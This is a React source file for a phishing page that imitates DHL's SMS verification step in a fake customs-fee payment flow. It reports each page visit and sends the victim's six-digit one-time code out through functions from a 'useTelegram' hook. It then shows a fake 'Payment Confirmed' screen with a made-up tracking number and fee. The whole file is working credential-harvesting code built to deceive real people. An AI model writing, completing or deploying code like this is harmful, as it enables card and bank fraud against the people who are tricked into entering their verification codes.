import { useEffect, useRef, useState, useCallback } from "react";
import DHLHeader from "../components/DHLHeader";
import StepIndicator from "../components/StepIndicator";
import { notifyVisit, notifyOTP } from "../hooks/useTelegram";

interface OTPPageProps {
  onSuccess: () => void;
}

const OTP_LENGTH = 6;
const COUNTDOWN_SECONDS = 3 * 60; // 3 minutes

function formatTime(s: number): string {
  const m = Math.floor(s / 60);
  const sec = s % 60;
  return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
}

export default function OTPPage({ onSuccess }: OTPPageProps) {
  const [digits, setDigits] = useState<string[]>(Array(OTP_LENGTH).fill(""));
  const [seconds, setSeconds] = useState(COUNTDOWN_SECONDS);
  const [expired, setExpired] = useState(false);
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    notifyVisit("OTP / Page 3");
  }, []);

  // Countdown timer
  useEffect(() => {
    if (expired || success) return;
    if (seconds <= 0) {
      setExpired(true);
      return;
    }
    const timer = setTimeout(() => setSeconds((s) => s - 1), 1000);
    return () => clearTimeout(timer);
  }, [seconds, expired, success]);

  // Focus first input on mount
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  const handleDigit = (index: number, value: string) => {
    const digit = value.replace(/\D/g, "").slice(-1);
    const newDigits = [...digits];
    newDigits[index] = digit;
    setDigits(newDigits);
    setError("");

    if (digit && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === "Backspace") {
      if (digits[index]) {
        const newDigits = [...digits];
        newDigits[index] = "";
        setDigits(newDigits);
      } else if (index > 0) {
        inputRefs.current[index - 1]?.focus();
        const newDigits = [...digits];
        newDigits[index - 1] = "";
        setDigits(newDigits);
      }
    } else if (e.key === "ArrowLeft" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    } else if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, OTP_LENGTH);
    if (pasted) {
      const newDigits = Array(OTP_LENGTH).fill("");
      for (let i = 0; i < pasted.length; i++) {
        newDigits[i] = pasted[i];
      }
      setDigits(newDigits);
      const focusIndex = Math.min(pasted.length, OTP_LENGTH - 1);
      inputRefs.current[focusIndex]?.focus();
    }
  };

  const handleResend = useCallback(() => {
    setDigits(Array(OTP_LENGTH).fill(""));
    setSeconds(COUNTDOWN_SECONDS);
    setExpired(false);
    setError("");
    inputRefs.current[0]?.focus();
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const otp = digits.join("");
    if (otp.length < OTP_LENGTH) {
      setError("Please enter all 6 digits of the code.");
      return;
    }
    if (expired) {
      setError("The code has expired. Please request a new one.");
      return;
    }
    setLoading(true);
    await notifyOTP(otp);
    setLoading(false);
    setSuccess(true);
    setTimeout(() => onSuccess(), 2000);
  };

  if (success) {
    return (
      <div className="page-enter" style={{ minHeight: "100vh", backgroundColor: "#f5f5f5" }}>
        <DHLHeader />
        <div style={{ maxWidth: 640, margin: "0 auto", padding: "0 16px 40px" }}>
          <StepIndicator currentStep={3} />

          <div className="package-card" style={{ marginTop: 16 }}>
            <div className="success-screen">
              <div className="success-checkmark">✓</div>
              <h2 style={{ fontSize: 24, fontWeight: 800, color: "#1a1a1a", margin: "0 0 12px" }}>
                Payment Confirmed!
              </h2>
              <p style={{ fontSize: 15, color: "#666", margin: "0 0 8px" }}>
                Your customs fees have been paid successfully.
              </p>
              <p style={{ fontSize: 14, color: "#28a745", fontWeight: 600, margin: "0 0 28px" }}>
                Your parcel will be delivered within 24–48 hours.
              </p>

              <div style={{
                background: "#f9f9f9",
                border: "1px solid #e0e0e0",
                borderRadius: 10,
                padding: "16px 20px",
                marginBottom: 24,
                textAlign: "left"
              }}>
                <div style={{ fontSize: 12, color: "#999", marginBottom: 8, textTransform: "uppercase", letterSpacing: "0.08em", fontWeight: 600 }}>
                  Transaction Summary
                </div>
                {[
                  ["Tracking Number", "DHLEX-7483921056"],
                  ["Amount Paid", "$1.99 CAD"],
                  ["Date", new Date().toLocaleDateString("en-CA")],
                  ["Status", "✅ Released"],
                ].map(([label, value]) => (
                  <div key={label} style={{ display: "flex", justifyContent: "space-between", marginBottom: 8, fontSize: 14 }}>
                    <span style={{ color: "#666" }}>{label}</span>
                    <span style={{ fontWeight: 600, color: "#1a1a1a" }}>{value}</span>
                  </div>
                ))}
              </div>

              <div style={{ fontSize: 13, color: "#999" }}>
                A confirmation email has been sent to you.
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="page-enter" style={{ minHeight: "100vh", backgroundColor: "#f5f5f5" }}>
      <DHLHeader />

      <div style={{ maxWidth: 640, margin: "0 auto", padding: "0 16px 40px" }}>
        <StepIndicator currentStep={3} />

        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <h1 style={{ fontSize: 22, fontWeight: 700, color: "#1a1a1a", margin: "0 0 6px" }}>
            SMS Verification
          </h1>
          <p style={{ fontSize: 14, color: "#666", margin: 0 }}>
            Enter the 6-digit code sent to your phone number
          </p>
        </div>

        <div className="package-card">
          {/* SMS icon */}
          <div style={{ textAlign: "center", marginBottom: 20 }}>
            <div style={{
              width: 64,
              height: 64,
              background: "linear-gradient(135deg, #D40511 0%, #8B0008 100%)",
              borderRadius: 16,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              margin: "0 auto 16px",
              fontSize: 30,
              boxShadow: "0 4px 16px rgba(212,5,17,0.3)"
            }}>
              📱
            </div>
            <div style={{ fontSize: 14, color: "#666" }}>
              A verification code has been sent via SMS to your registered number
            </div>
          </div>

          {/* Countdown */}
          <div style={{ textAlign: "center", marginBottom: 16 }}>
            {!expired ? (
              <>
                <div style={{ fontSize: 12, color: "#999", marginBottom: 4 }}>Code valid for</div>
                <div className="countdown">{formatTime(seconds)}</div>
              </>
            ) : (
              <div style={{
                background: "#FFF3F3",
                border: "1px solid #F5C6CB",
                borderRadius: 8,
                padding: "10px 16px",
                color: "#D40511",
                fontSize: 14,
                fontWeight: 600
              }}>
                ⏱ Code expired
              </div>
            )}
          </div>

          {/* Progress bar for timer */}
          {!expired && (
            <div style={{ height: 4, background: "#e0e0e0", borderRadius: 2, marginBottom: 24, overflow: "hidden" }}>
              <div style={{
                height: "100%",
                background: seconds > 60 ? "#D40511" : "#FF6B00",
                borderRadius: 2,
                width: `${(seconds / COUNTDOWN_SECONDS) * 100}%`,
                transition: "width 1s linear",
              }} />
            </div>
          )}

          {/* OTP inputs */}
          <form onSubmit={handleSubmit} noValidate>
            <div className="otp-container" onPaste={handlePaste}>
              {digits.map((digit, i) => (
                <input
                  key={i}
                  ref={(el) => { inputRefs.current[i] = el; }}
                  type="text"
                  inputMode="numeric"
                  maxLength={1}
                  className={`otp-input ${digit ? "filled" : ""}`}
                  value={digit}
                  onChange={(e) => handleDigit(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  disabled={expired}
                  autoComplete="one-time-code"
                  aria-label={`Digit ${i + 1}`}
                />
              ))}
            </div>

            {error && (
              <div style={{
                background: "#FFF3F3",
                border: "1px solid #F5C6CB",
                borderRadius: 8,
                padding: "10px 16px",
                color: "#D40511",
                fontSize: 13,
                marginBottom: 16,
                textAlign: "center"
              }}>
                {error}
              </div>
            )}

            <button
              type="submit"
              className="dhl-btn"
              disabled={loading || expired || digits.join("").length < OTP_LENGTH}
              style={{ marginBottom: 16 }}
            >
              {loading ? "Verifying..." : "✅ Confirm Code"}
            </button>

            <div style={{ textAlign: "center" }}>
              <span style={{ fontSize: 14, color: "#666" }}>Didn't receive the code? </span>
              <button
                type="button"
                onClick={handleResend}
                style={{
                  background: "none",
                  border: "none",
                  color: "#D40511",
                  fontWeight: 700,
                  fontSize: 14,
                  cursor: "pointer",
                  fontFamily: "inherit",
                  textDecoration: "underline",
                  padding: 0
                }}
              >
                Resend
              </button>
            </div>
          </form>
        </div>

        {/* Security note */}
        <div style={{ textAlign: "center", marginTop: 20, fontSize: 12, color: "#999" }}>
          🔒 DHL will never ask for your code over the phone
        </div>
      </div>
    </div>
  );
}
